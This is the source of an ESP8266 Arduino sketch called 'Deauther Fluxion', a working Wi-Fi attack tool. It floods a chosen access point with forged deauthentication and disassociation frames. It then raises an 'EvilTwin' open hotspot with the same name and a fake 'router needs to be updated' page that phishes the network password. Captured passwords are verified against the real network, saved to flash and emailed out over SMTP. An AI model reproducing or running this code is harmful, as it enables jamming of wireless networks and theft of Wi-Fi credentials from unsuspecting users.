#include "LittleFSRW.h"
#include "GlobalVar.h"
#include "ESPMailSend.h"
#include "HTML5.h"
#include "LedTicker.h"

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.pwr = WiFi.RSSI(i);
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
    flipper.attach(0.3, flip);
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("W4515T3ch", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    _SSIDPassword = "SSID : " + _selectedNetwork.ssid + " Password : " + _tryPassword ;
    // "<li><b>" + + "</li></b>"
    appendFile(LittleFS, "/pass.txt", _SSIDPassword.c_str());
    //_SSIDPassword.toCharArray(msg, 50);

    smtpsend(_wrongSSIDPassword, "Deauther Fluxion | Wrong Password");
    smtpsend(_SSIDPassword, "Deauther Fluxion | Good Password");

    _SSIDPassword = "<li>" + _SSIDPassword + "</li>";
    _savedSSIDPassword += _SSIDPassword;
    appendFile(LittleFS, "/password.txt", _savedSSIDPassword.c_str());
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    //readFile(LittleFS, "/password.txt");
    _savedSSIDPassword = readFiles(LittleFS, "/password.txt");
    Serial.println(_savedSSIDPassword);
    flipper.attach(0.1, flip);
  }
}

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("W4515T3ch", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + _networks[i].pwr + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        Serial.println(bytesToStr(_selectedNetwork.bssid, 6));
        _html += "<button id='button-ontbl' class='button-ontbl' button style='background-color: #ff0000;'>SSID Selected</button></form></td></tr>";
      } else {
        _html += "<button id='button-ontbl' class='button-ontbl'>Select SSID</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "<br><div><form style='display:inline-block;' method='post' action='/password'><button id='button' class='button' button style='display:inline-block;'>Saved Password</button></form>";
    _html += "<form style='display:inline-block;' method='post' action='/wrongpassword'><button id='button' class='button' button style='display:inline-block;'>Saved WrongPass</button></form></div>";

    _html += "<footer><p>Deauther Fluxion<br>" + versi + "</p></footer></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");

      _wrongSSIDPassword = "SSID : " + _selectedNetwork.ssid + " Password : " + _tryPassword ;
      appendFile(LittleFS, "/wrongpass.txt", _wrongSSIDPassword.c_str());

      String _wrongSSIDPasswordtemp = "<li>" + _wrongSSIDPassword + "</li>";
      _savedwrongSSIDPassword += _wrongSSIDPasswordtemp;
      appendFile(LittleFS, "/wrongpassword.txt", _savedwrongSSIDPassword.c_str());
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      flipper.attach(0.6, flip);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html>" + _Head + "</head><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
      flipper.attach(1, flip);
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("W4515T3ch", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + _networks[i].pwr + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/admin/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button id='button-ontbl' class='button-ontbl' button style='background-color: #ff0000;'>SSID Selected</button></form></td></tr>";
    } else {
      _html += "<button id='button-ontbl' class='button-ontbl'>Select SSID</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table>";
  _html += "<br><div><form style='display:inline-block;' method='post' action='/password'><button id='button' class='button' button style='display:inline-block;'>Saved Password</button></form>";
  _html += "<form style='display:inline-block;' method='post' action='/wrongpassword'><button id='button' class='button' button style='display:inline-block;'>Saved WrongPass</button></form></div>";

  _html += "<footer><p>Deauther Fluxion<br>" + versi + "</p></footer></body></html>";
  webServer.send(200, "text/html", _html);

}

void handlePassword() {
  _savedSSIDPassword = readFiles(LittleFS, "/password.txt");
  String _html = _tempHTML2;
  _html += "<nav><strong>Deauther Fluxion | Good Password</strong><br><p>" + versi + "</p></nav>";
  _html += "<ol>" + _savedSSIDPassword + "</ol>";
  _html += "<div><form style='display:inline-block;' method='post' action='/clearpassword'><button id='button' class='button' button style='display:inline-block;'>Clear Password</button></form>";
  _html += "<form style='display:inline-block;' method='post' action='/admin'><button id='button' class='button' button style='display:inline-block;'>Back to Admin</button></form></div>";
  _html += "<footer><p>Deauther Fluxion<br>" + versi + "</p></footer>";
  _html += "</body></html>";
  webServer.send(200, "text/html", _html);
}

void handlewrongPassword() {
  _savedwrongSSIDPassword = readFiles(LittleFS, "/wrongpassword.txt");
  String _html = _tempHTML2;
  _html += "<nav><strong>Deauther Fluxion | Wrong Password</strong><br><p>" + versi + "</p></nav>";
  _html += "<ol>" + _savedwrongSSIDPassword + "</ol>";
  _html += "<div><form style='display:inline-block;' method='post' action='/clearwrongpassword'><button id='button' class='button' button style='display:inline-block;'>Clear Wrong Password</button></form>";
  _html += "<form style='display:inline-block;' method='post' action='/admin'><button id='button' class='button' button style='display:inline-block;'>Back to Admin</button></form></div>";
  _html += "<footer><p>Deauther Fluxion<br>" + versi + "</p></footer>";
  _html += " </body></html>";
  webServer.send(200, "text/html", _html);
}

void handleclearPassword() {
  deleteFile(LittleFS, "/password.txt");
  String _html = _ClearPassword;
  _html += "<h2>Password Clear</h2></body></html>";
  webServer.send(200, "text/html", _html);
}

void handleclearwrongPassword() {
  deleteFile(LittleFS, "/wrongpassword.txt");
  String _html = _ClearPassword;
  _html += "<h2>Wrong Password Clear</h2></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void setup() {

  Serial.begin(115200);
  Serial.println("Formatting LittleFS filesystem");
  //LittleFS.format();
  Serial.println("Mount LittleFS");
  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    return;
  }
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("W4515T3ch", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/password", handlePassword);
  webServer.on("/wrongpassword", handlewrongPassword);
  webServer.on("/clearpassword", handleclearPassword);
  webServer.on("/clearwrongpassword", handleclearwrongPassword);
  webServer.onNotFound(handleIndex);
  httpUpdater.setup(&webServer);
  webServer.begin();

  //client.setServer(mqtt_server, 1883);
  //client.setCallback(callback);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
      Serial.println("WiFi connected");
      Serial.println("IP address: ");
      Serial.println(WiFi.localIP());
      _SSIDPassword = readFiles(LittleFS, "/pass.txt");
      Serial.println(_SSIDPassword);
      //msg =  _savedSSIDPassword;

    }
    wifinow = millis();
  }
  //client.loop();
}
